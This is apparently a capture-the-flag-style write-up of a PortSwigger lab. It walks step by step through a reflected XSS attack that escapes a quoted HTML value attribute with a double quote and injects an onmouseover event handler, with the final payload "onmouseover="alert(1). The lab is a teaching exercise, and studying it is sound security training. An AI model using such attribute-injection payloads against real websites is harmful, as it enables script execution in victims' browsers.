\# Reflected XSS into Attribute with Angle Brackets HTML-Encoded



\## Lab Description



\*\*Platform:\*\* PortSwigger Web Security Academy

\*\*Vulnerability:\*\* Reflected Cross-Site Scripting (XSS)

\*\*Context:\*\* HTML attribute

\*\*Status:\*\* Completed



The lab contains a reflected XSS vulnerability in the blog's search functionality.



The objective is to inject an HTML attribute that executes JavaScript using the `alert()` function.



\---



\## Solution



\### 1. Testing the Search Functionality



The application contains a search box:



```text

Search the blog...

```



I started with a harmless value:



```text

test123

```



After submitting the search, the URL became:



```text

/?search=test123

```



The input was also reflected into the HTML inside the search input's `value` attribute:



```html

<input type="text" placeholder="Search the blog..." name="search" value="test123">

```



!\[Screenshot 1](../images/screenshot1.png)



This showed that the `search` parameter was controlled by the user and reflected back into the page.



\---



\### 2. Testing HTML Injection



Since the input was reflected into the HTML, I tested whether I could inject HTML using angle brackets.



I tried:



```html

<test123>

```



However, the application encoded the angle brackets:



```html

value="\&lt;test123\&gt;">

```



!\[Screenshot 2](../images/screenshot2.png)



The browser therefore treats `<test123>` as text instead of interpreting it as an HTML element.



\---



\### 3. Understanding the HTML Context



I then tested the same input and inspected how the application handled the encoded characters.



The result showed:



```html

<input type="text" placeholder="Search the blog..." name="search" value="\&lt;test123\&gt;">

```



!\[Screenshot 3](../images/screenshot3.png)



This showed that the application was HTML-encoding `<` and `>`.



Because angle brackets were being encoded, I could not simply inject a new HTML element such as:



```html

<script>alert(1)</script>

```



Instead, I needed to work within the existing HTML attribute.



The important part of the HTML was:



```html

value="test123"

```



The input is inside a \*\*quoted attribute\*\*.



Therefore, the next step was to try breaking out of the existing `value` attribute using a double quote:



```text

"

```



Once outside the original attribute, another attribute could potentially be added.



\---



\### 4. Injecting an Event Handler



HTML elements can contain event-handler attributes such as:



```html

onmouseover

onclick

onfocus

```



I tested the following payload:



```html

"onmouseover="alert(1)

```



The idea was to close the existing `value` attribute and add an event handler.



Conceptually, the HTML becomes:



```html

<input type="text" value="" onmouseover="alert(1)">

```



The injected JavaScript is therefore associated with the `onmouseover` event.



\---



\### 5. Successful XSS



After submitting the payload and interacting with the injected element, the browser executed:



```javascript

alert(1)

```



!\[Screenshot 4](../images/screenshot4.png)



The successful alert confirmed that the application is vulnerable to \*\*Reflected XSS through an HTML attribute injection\*\*.



\---



\## Key Takeaway



The important part of this lab was understanding the \*\*HTML context\*\* of the reflected input.



The application reflected the `search` parameter inside:



```html

value="USER\_INPUT"

```



Although `<` and `>` were HTML-encoded, the double quote was still useful for escaping the existing attribute.



The attack therefore changed from trying to inject a new HTML element:



```html

<script>alert(1)</script>

```



to injecting an event-handler attribute:



```html

"onmouseover="alert(1)

```



The vulnerability can be summarized as:



```text

search parameter

&#x20;     ↓

reflected into HTML

&#x20;     ↓

value="USER\_INPUT"

&#x20;     ↓

escape attribute with "

&#x20;     ↓

inject event handler

&#x20;     ↓

JavaScript execution

```



\## Final Payload



```html

"onmouseover="alert(1)

```



